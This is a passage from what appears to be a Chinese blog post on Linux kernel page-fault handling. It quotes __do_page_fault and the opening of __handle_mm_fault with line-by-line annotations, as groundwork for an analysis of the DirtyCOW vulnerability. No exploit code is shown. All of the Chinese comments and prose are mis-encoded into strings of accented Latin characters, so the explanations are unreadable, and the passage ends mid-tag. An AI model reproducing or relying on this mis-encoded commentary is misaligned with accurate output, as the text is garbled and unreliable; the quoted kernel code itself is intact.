*<span class="title">vma</span>;</span><span class="comment">//çº¿æ€§åŒºæè¿°ç¬¦ï¼Œç”¨ä»¥æ ‡è¯†ä¸€å—è¿ç»­çš„åœ°å€ç©ºé—´ï¼Œå¤šä¸ªvmaä¹‹é—´ä½¿ç”¨å•å‘é“¾è¡¨ç»“æ„è¿æ¥</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span><span class="comment">//è¿›ç¨‹æè¿°ç¬¦ï¼Œç”¨ä»¥æè¿°ä¸€ä¸ªè¿›ç¨‹</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span><span class="comment">//å†…å­˜æè¿°ç¬¦ï¼Œç”¨ä»¥æè¿°ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜åœ°å€ç©ºé—´</span></span><br><span class="line">	<span class="type">int</span> fault, major = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;<span class="comment">//è®¾ç½®flagçš„å…è®¸é‡è¯• &amp;&amp; å…è®¸æ€æ­»ï¼ˆè¿›ç¨‹ï¼Ÿï¼‰æ ‡å¿—ä½</span></span><br><span class="line"></span><br><span class="line">	tsk = current;</span><br><span class="line">	mm = tsk-&gt;mm;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Detect and handle instructions that would cause a page fault for</span></span><br><span class="line"><span class="comment">	 * both a tracked kernel page and a userspace page.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (kmemcheck_active(regs))</span><br><span class="line">		kmemcheck_hide(regs);</span><br><span class="line">	prefetchw(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(kmmio_fault(regs, address)))<span class="comment">//mmiotraceè·Ÿè¸ªå™¨ç›¸å…³</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We fault-in kernel-space virtual memory on-demand. The</span></span><br><span class="line"><span class="comment">	 * &#x27;reference&#x27; page table is init_mm.pgd.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * NOTE! We MUST NOT take any locks for this case. We may</span></span><br><span class="line"><span class="comment">	 * be in an interrupt or a critical region, and should</span></span><br><span class="line"><span class="comment">	 * only copy the information from the master page table,</span></span><br><span class="line"><span class="comment">	 * nothing more.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * This verifies that the fault happens in kernel space</span></span><br><span class="line"><span class="comment">	 * (error_code &amp; 4) == 0, and that the fault was not a</span></span><br><span class="line"><span class="comment">	 * protection error (error_code &amp; 9) == 0.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;<span class="comment">//å‘ç”Ÿç¼ºé¡µå¼‚å¸¸çš„åœ°å€ä½äºå†…æ ¸ç©ºé—´ï¼Œè¿™é‡Œç”±äºå†…æ ¸ç©ºé—´é¡µé¢ä½¿ç”¨é¢‘ç¹ï¼Œä¸€èˆ¬ä¸ä¼šå‘ç”Ÿç¼ºé¡µå¼‚å¸¸ï¼Œæ‰€ä»¥ä½¿ç”¨unlikelyå®ä¼˜åŒ–</span></span><br><span class="line">		<span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;<span class="comment">//ä¸‰ä¸ªæ ‡å¿—ä½ï¼šä½¿ç”¨äº†é¡µè¡¨é¡¹ä¿ç•™çš„æ ‡å¿—ä½ã€ç”¨æˆ·ç©ºé—´é¡µå¼‚å¸¸ã€é¡µä¿æŠ¤å¼‚å¸¸ï¼Œä¸‰ä¸ªæ ‡å¿—ä½éƒ½æ— è¯´æ˜æ˜¯ç”±å†…æ ¸è§¦å‘çš„å†…æ ¸ç©ºé—´çš„ç¼ºé¡µå¼‚å¸¸</span></span><br><span class="line">			<span class="keyword">if</span> (vmalloc_fault(address) &gt;= <span class="number">0</span>)<span class="comment">//å¤„ç†vmallocå¼‚å¸¸</span></span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (kmemcheck_fault(regs, address, error_code))</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Can handle a stale RO-&gt;RW TLB: */</span></span><br><span class="line">		<span class="keyword">if</span> (spurious_fault(error_code, address))<span class="comment">//æ£€æµ‹æ˜¯å¦æ˜¯å‡çš„page faultï¼ˆTLBçš„å»¶è¿Ÿflushé€ æˆï¼‰</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line">		<span class="keyword">if</span> (kprobes_fault(regs))<span class="comment">//è½¬å†…æ ¸æ¢é’ˆå¤„ç†</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span></span><br><span class="line"><span class="comment">		 * fault we could otherwise deadlock:</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		bad_area_nosemaphore(regs, error_code, address);<span class="comment">//å‰é¢çš„æƒ…å†µéƒ½ä¸æ˜¯ï¼Œè¯´æ˜å‘ç”Ÿäº†å¯¹éæ³•åœ°å€è®¿é—®çš„å†…æ ¸å¼‚å¸¸ï¼ˆå¦‚ç”¨æˆ·æ€å°è¯•è®¿é—®å†…æ ¸ç©ºé—´ï¼‰,æ€æ­»è¿›ç¨‹å’Œå†…æ ¸çš„&quot;Oops&quot;</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ¥ä¸‹æ¥æ˜¯å¯¹äºå‘ç”Ÿåœ¨ç”¨æˆ·ç©ºé—´çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(kprobes_fault(regs)))<span class="comment">//è½¬å†…æ ¸æ¢é’ˆå¤„ç†</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))<span class="comment">//ä½¿ç”¨äº†é¡µè¡¨é¡¹ä¿ç•™çš„æ ‡å¿—ä½</span></span><br><span class="line">		pgtable_bad(regs, error_code, address);<span class="comment">//é¡µè¡¨é”™è¯¯ï¼Œå¤„ç†</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;<span class="comment">//è§¦å‘smapä¿æŠ¤ï¼ˆå†…æ ¸ç›´æ¥è®¿é—®ç”¨æˆ·åœ°å€ç©ºé—´ï¼‰</span></span><br><span class="line">		bad_area_nosemaphore(regs, error_code, address);<span class="comment">//æ€æ­»è¿›ç¨‹å’Œå†…æ ¸çš„&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we&#x27;re in an interrupt, have no user context or are running</span></span><br><span class="line"><span class="comment">	 * in a region with pagefaults disabled then we must not take the fault</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;<span class="comment">//è®¾ç½®äº†ä¸å¤„ç†ç¼ºé¡µå¼‚å¸¸ | è¿›ç¨‹æ²¡æœ‰åœ°å€ç©ºé—´ï¼ˆï¼Ÿï¼‰</span></span><br><span class="line">		bad_area_nosemaphore(regs, error_code, address);<span class="comment">//æ€æ­»è¿›ç¨‹å’Œå†…æ ¸çš„&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span></span><br><span class="line"><span class="comment">	 * vmalloc fault has been handled.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * User-mode registers count as a user access even for any</span></span><br><span class="line"><span class="comment">	 * potential system fault or CPU buglet:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (user_mode(regs)) &#123;<span class="comment">//å‘ç”Ÿç¼ºé¡µå¼‚å¸¸æ—¶çš„å¯„å­˜å™¨çŠ¶æ€ä¸ºç”¨æˆ·æ€ä¸‹çš„</span></span><br><span class="line">		local_irq_enable();<span class="comment">//æœ¬åœ°ä¸­æ–­è¯·æ±‚(irq, interrupt request)å¼€å¯</span></span><br><span class="line">		error_code |= PF_USER;<span class="comment">//è®¾ç½®é”™è¯¯ä»£ç çš„ã€ç”¨æˆ·ç©ºé—´é¡µã€‘æ ‡å¿—ä½</span></span><br><span class="line">		flags |= FAULT_FLAG_USER;<span class="comment">//è®¾ç½®flagçš„ã€ç”¨æˆ·ç©ºé—´é¡µã€‘æ ‡å¿—ä½</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">			local_irq_enable();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="number">1</span>, regs, address);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (error_code &amp; PF_WRITE)<span class="comment">//å†™é¡µå¼‚å¸¸ï¼Œå¯èƒ½æ˜¯é¡µä¸å­˜åœ¨/æ— æƒé™å†™</span></span><br><span class="line">		flags |= FAULT_FLAG_WRITE;<span class="comment">//è®¾ç½®flagçš„ã€å†™é¡µå¼‚å¸¸ã€‘æ ‡å¿—ä½</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When running in the kernel we expect faults to occur only to</span></span><br><span class="line"><span class="comment">	 * addresses in user space.  All other faults represent errors in</span></span><br><span class="line"><span class="comment">	 * the kernel and should generate an OOPS.  Unfortunately, in the</span></span><br><span class="line"><span class="comment">	 * case of an erroneous fault occurring in a code path which already</span></span><br><span class="line"><span class="comment">	 * holds mmap_sem we will deadlock attempting to validate the fault</span></span><br><span class="line"><span class="comment">	 * against the address space.  Luckily the kernel only validly</span></span><br><span class="line"><span class="comment">	 * references user space from well defined areas of code, which are</span></span><br><span class="line"><span class="comment">	 * listed in the exceptions table.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * As the vast majority of faults will be valid we will only perform</span></span><br><span class="line"><span class="comment">	 * the source reference check when there is a possibility of a</span></span><br><span class="line"><span class="comment">	 * deadlock. Attempt to lock the address space, if we cannot we then</span></span><br><span class="line"><span class="comment">	 * validate the source. If this is invalid we can skip the address</span></span><br><span class="line"><span class="comment">	 * space check, thus avoiding the deadlock:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">//ç»™è¿›ç¨‹çš„mm_structä¸Šé”</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;<span class="comment">//æ²¡èƒ½é”ä¸Š</span></span><br><span class="line">		<span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp; <span class="comment">//å†…æ ¸ç©ºé—´é¡µå¼‚å¸¸</span></span><br><span class="line">		    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">			bad_area_nosemaphore(regs, error_code, address);<span class="comment">//æ€æ­»è¿›ç¨‹å’Œå†…æ ¸çš„&quot;Oops&quot;</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">retry:</span><br><span class="line">		down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;<span class="comment">//é”ä¸Šäº†</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * The above down_read_trylock() might have succeeded in</span></span><br><span class="line"><span class="comment">		 * which case we&#x27;ll have missed the might_sleep() from</span></span><br><span class="line"><span class="comment">		 * down_read():</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		might_sleep();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vma = find_vma(mm, address);<span class="comment">//å¯»æ‰¾è¯¥çº¿æ€§åœ°å€ä½äºå“ªä¸ªvmaä¸­</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!vma)) &#123;<span class="comment">//æ²¡æ‰¾åˆ°ï¼Œè¯´æ˜è¯¥åœ°å€ä¸å±äºè¯¥è¿›ç¨‹çš„ä»»ä½•ä¸€ä¸ªvmaä¸­ï¼ˆéæ³•è®¿é—®ï¼Ÿæ®µé”™è¯¯ï¼Ÿï¼‰</span></span><br><span class="line">		bad_area(regs, error_code, address);<span class="comment">//æ€æ­»è¿›ç¨‹å’Œå†…æ ¸çš„&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))<span class="comment">//å‘ç”Ÿç¼ºé¡µå¼‚å¸¸çš„åœ°å€åˆšå¥½ä½äºæŸä¸ªvmaåŒºåŸŸä¸­</span></span><br><span class="line">		<span class="keyword">goto</span> good_area;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;<span class="comment">//è®¾ç½®äº†VM_GROWSDOWNæ ‡è®°ï¼Œè¡¨ç¤ºç¼ºé¡µå¼‚å¸¸åœ°å€ä½äºå †æ ˆåŒº</span></span><br><span class="line">		bad_area(regs, error_code, address);<span class="comment">//æ€æ­»è¿›ç¨‹å’Œå†…æ ¸çš„&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (error_code &amp; PF_USER) &#123;<span class="comment">//ç¼ºé¡µå¼‚å¸¸åœ°å€ä½äºç”¨æˆ·ç©ºé—´</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Accessing the stack below %sp is always a bug.</span></span><br><span class="line"><span class="comment">		 * The large cushion allows instructions like enter</span></span><br><span class="line"><span class="comment">		 * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span></span><br><span class="line"><span class="comment">		 * 32 pointers and then decrements %sp by 65535.)</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>) &lt; regs-&gt;sp)) &#123;<span class="comment">//çœ‹ä¸æ‡‚éƒ½...</span></span><br><span class="line">			bad_area(regs, error_code, address);<span class="comment">//æ€æ­»è¿›ç¨‹å’Œå†…æ ¸çš„&quot;Oops&quot;</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;<span class="comment">//ç”¨æˆ·æ ˆä¸Šçš„ç¼ºé¡µå¼‚å¸¸ï¼Œä½†æ˜¯æ ˆå¢é•¿å¤±è´¥äº†</span></span><br><span class="line">		bad_area(regs, error_code, address);<span class="comment">//æ€æ­»è¿›ç¨‹å’Œå†…æ ¸çš„&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ok, we have a good vm_area for this memory access, so</span></span><br><span class="line"><span class="comment">	 * we can handle it..</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">//è¿è¡Œåˆ°è¿™é‡Œï¼Œè¯´æ˜æ˜¯æ­£å¸¸çš„ç¼ºé¡µå¼‚å¸¸ï¼Œaddrå±äºè¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œæ­¤æ—¶è¿›è¡Œè¯·æ±‚è°ƒé¡µï¼Œåˆ†é…ç‰©ç†å†…å­˜</span></span><br><span class="line">good_area:</span><br><span class="line">	<span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;<span class="comment">//error codeå’Œvmaå†²çªï¼Ÿ</span></span><br><span class="line">		bad_area_access_error(regs, error_code, address);<span class="comment">//æ€æ­»è¿›ç¨‹å’Œå†…æ ¸çš„&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If for any reason at all we couldn&#x27;t handle the fault,</span></span><br><span class="line"><span class="comment">	 * make sure we exit gracefully rather than endlessly redo</span></span><br><span class="line"><span class="comment">	 * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span></span><br><span class="line"><span class="comment">	 * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	fault = handle_mm_fault(mm, vma, address, flags);<span class="comment">//åˆ†é…ç‰©ç†é¡µçš„æ ¸å¿ƒå‡½æ•°</span></span><br><span class="line">	major |= fault &amp; VM_FAULT_MAJOR;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we need to retry the mmap_sem has already been released,</span></span><br><span class="line"><span class="comment">	 * and if there is a fatal signal pending there is no guarantee</span></span><br><span class="line"><span class="comment">	 * that we made any progress. Handle this case first.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;<span class="comment">//æ²¡æ‰¾åˆ°è®¾ç½®è¿™ä¸ªæ ‡å¿—ä½çš„ï¼Œä¸ç®¡...</span></span><br><span class="line">		<span class="comment">/* Retry at most once */</span></span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">			flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;<span class="comment">//æ¸…é™¤ã€é‡è¯•ã€‘æ ‡å¿—ä½</span></span><br><span class="line">			flags |= FAULT_FLAG_TRIED;<span class="comment">//è®¾ç½®ã€å·²è¯•ã€‘æ ‡å¿—ä½</span></span><br><span class="line">			<span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* User mode? Just return to handle the fatal exception */</span></span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)<span class="comment">//ç”¨æˆ·æ€è§¦å‘ç”¨æˆ·åœ°å€ç©ºé—´ç¼ºé¡µå¼‚å¸¸ï¼Œäº¤ç”±ä¸Šå±‚å‡½æ•°å¤„ç†äº†</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Not returning to user mode? Handle exceptions or die: */</span></span><br><span class="line">		no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);<span class="comment">//å†…æ ¸åœ°å€ç©ºé—´ç¼ºé¡µå¼‚å¸¸ï¼Œç®€å•å¤„ç†ä¸€ä¸‹ï¼Œäº¤ç”±ä¸Šå±‚å‡½æ•°å¤„ç†</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;</span><br><span class="line">		mm_fault_error(regs, error_code, address, fault);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Major/minor page fault accounting. If any of the events</span></span><br><span class="line"><span class="comment">	 * returned VM_FAULT_MAJOR, we account it as a major fault.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (major) &#123;</span><br><span class="line">		tsk-&gt;maj_flt++;</span><br><span class="line">		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="number">1</span>, regs, address);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		tsk-&gt;min_flt++;</span><br><span class="line">		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="number">1</span>, regs, address);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	check_v8086_mode(regs, address, tsk);</span><br><span class="line">&#125;</span><br><span class="line">NOKPROBE_SYMBOL(__do_page_fault);</span><br></pre></td></tr></table></figure>

<p>å¤§è‡´æµç¨‹åº”å½“å¦‚ä¸‹ï¼š</p>
<ul>
<li>åˆ¤æ–­ç¼ºé¡µå¼‚å¸¸åœ°å€ä½äºç”¨æˆ·åœ°å€ç©ºé—´è¿˜æ˜¯å†…æ ¸åœ°å€ç©ºé—´</li>
<li>ä½äºå†…æ ¸åœ°å€ç©ºé—´<ul>
<li>å†…æ ¸æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œ<code>vmalloc_fault()</code> å¤„ç†</li>
<li>ç”¨æˆ·æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ®µé”™è¯¯ï¼Œå‘é€SIGSEGVä¿¡å·</li>
</ul>
</li>
<li>ä½äºç”¨æˆ·åœ°å€ç©ºé—´<ul>
<li>å†…æ ¸æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸<ul>
<li>SMAPä¿æŠ¤å·²å¼€å¯ï¼Œç»ˆæ­¢è¿›ç¨‹</li>
<li>è¿›ç¨‹æ— åœ°å€ç©ºé—´ | è®¾ç½®äº†ä¸å¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œç»ˆæ­¢è¿›ç¨‹</li>
<li>è¿›å…¥ä¸‹ä¸€æ­¥æµç¨‹</li>
</ul>
</li>
<li>ç”¨æˆ·æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸<ul>
<li>è®¾ç½®å¯¹åº”æ ‡å¿—ä½ï¼Œè¿›å…¥ä¸‹ä¸€æ­¥æµç¨‹</li>
</ul>
</li>
<li>æ£€æŸ¥æ˜¯å¦æ˜¯å†™é¡µå¼‚å¸¸ï¼Œå¯èƒ½æ˜¯é¡µä¸å­˜åœ¨&#x2F;æ— æƒé™å†™ï¼Œè®¾ç½®å¯¹åº”æ ‡å¿—ä½</li>
<li>æ‰¾å¯»çº¿æ€§åœ°å€æ‰€å±çš„çº¿æ€§åŒºï¼ˆvmaï¼‰[1]<ul>
<li>ä¸å­˜åœ¨å¯¹åº”vmaï¼Œéæ³•è®¿é—®</li>
<li>å­˜åœ¨å¯¹åº”vmaï¼Œä¸”ä½äºvmaæ‰€æè¿°åŒºåŸŸä¸­ï¼Œè¿›å…¥ä¸‹ä¸€æ­¥æµç¨‹</li>
<li>å­˜åœ¨å¯¹åº”vmaï¼Œä¸ä½äºvmaæ‰€æè¿°åŒºåŸŸä¸­ï¼Œè¯´æ˜å¯èƒ½æ˜¯ä½äºå †æ ˆï¼ˆstackï¼‰ï¼Œå°è¯•å¢é•¿å †æ ˆ</li>
</ul>
</li>
<li>âœ³è°ƒç”¨ <code>handle_mm_fault()</code> å‡½æ•°å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¤„ç†ç¼ºé¡µå¼‚å¸¸çš„æ ¸å¿ƒå‡½æ•°<ul>
<li>å¤±è´¥äº†ï¼Œè¿›è¡Œé‡è¯•ï¼ˆè¿”å›åˆ°[1]ï¼Œåªä¼šé‡è¯•ä¸€æ¬¡ï¼‰</li>
<li>å…¶ä»–æ”¶å°¾å¤„ç†</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>å…¶ä¸­è¿›ç¨‹æè¿°ç¬¦ï¼ˆtask_structï¼‰ã€å†…å­˜æè¿°ç¬¦ï¼ˆmm_structï¼‰ã€çº¿æ€§åŒºæè¿°ç¬¦vm_arena_structï¼‰ä¹‹é—´çš„å…³ç³»åº”å½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆè½¬è‡ªçœ‹é›ªè®ºå›ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2021/04/12/IHzaPwMrkCUs3xj.png" alt="image.png"></p>
<blockquote>
<p>å¾ˆå¯æƒœçš„æ˜¯æœ¬æ¬¡åˆ†æçš„dirtyCOWè™½ç„¶èµ° <code>__handle_mm_fault()</code> ä½†æ˜¯ä¸èµ° <code>__do_page_fault()</code> ï¼ˆ<del>è¿™ä¸æ˜¯ç™½åˆ†æä¸€é€šä¹ˆ</del>ï¼ˆ<del>æ¼</del>ï¼‰</p>
</blockquote>
<h4 id="åˆ†é…é¡µè¡¨é¡¹ï¼š-handle-mm-fault"><a href="#åˆ†é…é¡µè¡¨é¡¹ï¼š-handle-mm-fault" class="headerlink" title="åˆ†é…é¡µè¡¨é¡¹ï¼š__handle_mm_fault()"></a>åˆ†é…é¡µè¡¨é¡¹ï¼š__handle_mm_fault()</h4><p>è¯¥å‡½æ•°å®šä¹‰äº <code>mm/memory.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * By the time we get here, we already hold the mm semaphore</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The mmap_sem may have been released depending on flags and our</span></span><br><span class="line"><span class="comment"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __handle_mm_fault(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span><br><span class="line">			     <span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">unsigned</span> <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//Linuxä½¿ç”¨å››çº§é¡µè¡¨ç»“æ„</span></span><br><span class="line">	<span class="type">pgd_t</span> *pgd;<span class="comment">//é¡µå…¨å±€ç›®å½•é¡¹</span></span><br><span class="line">	<span class="type">pud_t</span> *pud;<span class="comment">//é¡µä¸Šçº§ç›®å½•é¡¹</span></span><br><span class="line">	<span class="type">pmd_t</span> *pmd;<span class="comment">//é¡µä¸­é—´ç›®å½•é¡¹</span></span><br><span class="line">	<span class="type">pte_t</span> *pte;<span class="comment">//é¡µè¡¨é¡¹</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ä»¥ä¸‹ä¸ºé¡µè¡¨ç›¸å…³å¤„ç†</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(is_vm_hugetlb_page(vma)))</span><br><span class="line">		<span class="keyword">return</span> hugetlb_fault(mm, vma, address, flags);</span><br><span class="line"></span><br><span class="line">	pgd = pgd_offset(mm, address);<span 